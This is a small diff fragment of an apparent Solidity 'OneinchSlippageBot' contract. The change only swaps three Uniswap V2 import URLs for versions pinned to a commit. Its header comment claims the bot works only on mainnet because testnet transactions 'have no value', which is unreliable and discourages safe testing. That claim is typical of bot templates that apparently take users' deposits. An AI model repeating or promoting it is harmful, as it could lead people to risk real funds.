@@ -3,9 +3,9 @@ pragma solidity ^0.6.6;
 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
 // Import Libraries Migrator/Exchange/Factory
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+import "https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/interfaces/IUniswapV2ERC20.sol";
+import "https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/v2-core/blob/ee547b17853e71ed4e0101ccfd52e70d5acded58/contracts/interfaces/IUniswapV2Pair.sol";
 
 contract OneinchSlippageBot
 {
